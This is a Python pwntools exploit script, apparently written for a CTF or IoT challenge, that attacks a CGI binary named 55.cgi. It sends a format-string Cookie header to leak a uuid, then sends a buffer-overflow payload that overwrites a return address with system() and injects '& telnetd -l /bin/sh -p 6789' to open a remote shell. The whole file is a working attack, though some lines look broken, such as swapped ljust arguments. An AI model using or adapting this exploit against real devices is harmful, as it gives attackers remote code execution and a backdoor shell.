#!/usr/bin/env python
#-*-coding:utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

request_url = "http://127.0.0.1:80/55.cgi"

headers_for_get_uuid = {
	"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
	"Content-Type":"application/x-www-form-urlencoded",
  # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
	"Cookies":"%s%s%s" 
}

res = rq.post(request_url,headers = headers_for_get_uuid)

log.info("res: "+res)
# get_uuid

headers = {
	"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
	"Content-Type":"application/x-www-form-urlencoded",
  # 替换掉这里的uuid
	"Cookies":"uuid=aaaabbbbccccdddd"
}

commend = "& telnetd -l /bin/sh -p 6789 ;"

system = 0x000109DC

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust('B',0x2f4)
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))

rq.post(request_url,headers = headers ,data=payload)
